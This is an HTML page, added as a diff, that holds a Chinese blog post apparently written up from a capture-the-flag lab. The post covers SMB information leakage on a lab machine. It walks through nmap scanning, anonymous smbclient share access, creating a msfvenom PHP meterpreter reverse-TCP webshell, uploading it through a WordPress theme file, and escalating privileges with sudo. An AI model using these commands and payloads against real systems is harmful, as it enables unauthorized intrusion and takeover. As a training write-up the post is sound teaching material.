@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一、SMB介绍SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。">
+<meta name="keywords" content="CTF,SMB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SMB信息泄露">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;CTF&#x2F;index.html">
+<meta property="og:site_name" content="AqYoung">
+<meta property="og:description" content="一、SMB介绍SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb10.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb11.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb12.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb13.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb14.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb18.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb16.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb17.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb19.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb20.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb21.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb22.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb23.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb24.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb25.png">
+<meta property="og:updated_time" content="2020-03-26T08:39:06.287Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;smb&#x2F;smb1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/12/14/CTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF-SMB信息泄露 | AqYoung</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">AqYoung</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/14/CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AqYoung">
+      <meta itemprop="description" content="个人技术分享">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AqYoung">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-SMB信息泄露
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-14 17:13:34" itemprop="dateCreated datePublished" datetime="2019-12-14T17:13:34+08:00">2019-12-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-26 16:39:06" itemprop="dateModified" datetime="2020-03-26T16:39:06+08:00">2020-03-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">CTF夺旗训练</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、SMB介绍"><a href="#一、SMB介绍" class="headerlink" title="一、SMB介绍"></a>一、SMB介绍</h2><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<a id="more"></a></p>
+<p>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p>
+<p>SMB协议，计算机可以访问网络资源，下载对应的资源文件</p>
+<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.137<br>目的：获取靶场机器的flag值</p>
+<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测：</strong></p>
+<ul>
+<li>nmap -sV IP        挖掘开放服务信息<br><img src="/images/smb/smb1.png" alt=""></li>
+<li>nmap -A -v -T4 IP  挖掘靶场全部信息<br><img src="/images/smb/smb2.png" alt=""><br><img src="/images/smb/smb3.png" alt=""></li>
+</ul>
+<p><strong>2、 针对SMB协议弱点分析</strong><br><em>1.针对SMB协义，使用空口令，若口令尝试登陆，并查看敏感卡载查看；</em></p>
+<ul>
+<li><p>smbclient -L IP<br><img src="/images/smb/smb4.png" alt=""></p>
+</li>
+<li><p>smbclient \‘IP\share$’<br>尝试登陆上面的sharename结果share可以用空密码进去，并且存在敏感文件<br><img src="/images/smb/smb5.png" alt=""></p>
+</li>
+<li><p>get 敏感文件<br><img src="/images/smb/smb6.png" alt=""><br>进一步嗅探<br><img src="/images/smb/smb7.png" alt=""><br>果然有发现<br><img src="/images/smb/smb8.png" alt=""><br>尝试登陆数据库<br><img src="/images/smb/smb9.png" alt=""><br>登陆失败！！！</p>
+</li>
+</ul>
+<p><em>2.针对SMB协议远程溢出漏洞进行分析；</em><br><img src="/images/smb/smb10.png" alt=""></p>
+<ul>
+<li>searchsploit samba 版本号<br><img src="/images/smb/smb11.png" alt=""></li>
+</ul>
+<p><strong>3、针对HTTP协议弱点分析</strong><br><em>1.浏览器查看网站；</em><br><img src="/images/smb/smb12.png" alt=""></p>
+<p><em>2.使用dirb nikto探测；</em><br><img src="/images/smb/smb13.png" alt=""><br><img src="/images/smb/smb14.png" alt=""></p>
+<p><em>3.寻找突破点，目标登录后台，上传webshell；</em></p>
+<p><img src="/images/smb/smb18.png" alt=""></p>
+<p> <strong>- 制作webshell</strong></p>
+<p>msfvenom -p php/meterpreter/reverse_tcp -lhost=攻击机ip地址 Iport=4444 -f raw&gt;/root/Desktop/shell.php<br><img src="/images/smb/smb16.png" alt=""></p>
+<p> <strong>- 启动监听</strong><br>msf&gt;use exploit/multi/handler<br>msf exploift（handler）&gt;set payload php/meterpreter/reverse_tcp<br>msf exploift（handler）&gt;set lhost 攻击机IP地址<br>msf exploit（handler）&gt;set lport 4444<br>msf exploit（handler）&gt;run</p>
+<p> <strong>- 上传Webshell</strong><br>使用找到的敏感信息登录系统后台，上传webshell。执行<br>webshell（访问具有webshell的php页面）<br><img src="/images/smb/smb17.png" alt=""></p>
+<p>wordpress 上传点theme 404.php<br>执行：http:/靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php<br><img src="/images/smb/smb19.png" alt=""></p>
+<p>获得反弹的shell<br><img src="/images/smb/smb20.png" alt=""></p>
+<p><strong>4、查找flag信息</strong><br>优化终端：</p>
+<pre><code>python -c&quot;import pty;pty.spawn（&apos;/bin/bash&apos;）&quot;</code></pre><p><img src="/images/smb/smb21.png" alt=""></p>
+<p>查找敏感信息，提升root权限，查看flag值。<br><img src="/images/smb/smb22.png" alt=""></p>
+<p>查找用户名：cat/etc/passwd查找密码：在共享目录下的敏感文件，提升权限<br>–su用户名<br>–sudo -l<br>–su sudo<br><img src="/images/smb/smb23.png" alt=""><br><img src="/images/smb/smb24.png" alt=""><br><em>很幸运的使用弱密码登陆了进来了</em><br><img src="/images/smb/smb25.png" alt=""></p>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件。<br>一般情况下lag值都在/root目录下，并且需要提升root权限才能查看内容；</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/SMB/" rel="tag"># SMB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/14/CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/" rel="prev" title="CTF-SSH私钥泄露CTF-SSH服务测试">
+      <i class="fa fa-chevron-left"></i> CTF-SSH私钥泄露CTF-SSH服务测试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="next" title="CTF-SMB信息泄露">
+      CTF-SMB信息泄露 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、SMB介绍"><span class="nav-number">1.</span> <span class="nav-text">一、SMB介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、实验环境"><span class="nav-number">2.</span> <span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、实验过程"><span class="nav-number">3.</span> <span class="nav-text">三、实验过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、总结"><span class="nav-number">4.</span> <span class="nav-text">四、总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AqYoung"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AqYoung</p>
+  <div class="site-description" itemprop="description">个人技术分享</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AqYoung</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
